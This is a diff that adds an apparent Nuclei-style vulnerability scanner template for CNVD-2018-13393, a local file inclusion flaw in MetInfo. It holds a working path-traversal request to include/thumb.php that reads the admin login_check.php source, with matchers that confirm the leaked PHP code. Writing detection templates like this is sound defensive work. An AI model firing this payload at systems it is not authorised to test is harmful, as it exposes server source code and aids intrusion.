@@ -1,0 +1,32 @@
+http:
+    - host-redirects: true
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <?php
+            - login_met_cookie($metinfo_admin_name);
+      matchers-condition: and
+      max-redirects: 2
+      method: GET
+      path:
+        - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'
+id: CNVD-2018-13393
+info:
+    author: ritikchaddha
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+        cvss-score: 8.6
+        cwe-id: CWE-22
+    description: Metinfo is susceptible to local file inclusion.
+    metadata:
+        max-request: 1
+    name: Metinfo - Local File Inclusion
+    reference:
+        - https://paper.seebug.org/676/
+    severity: high
+    tags:
+        - metinfo
+        - cvnd2018
+        - MetInfo
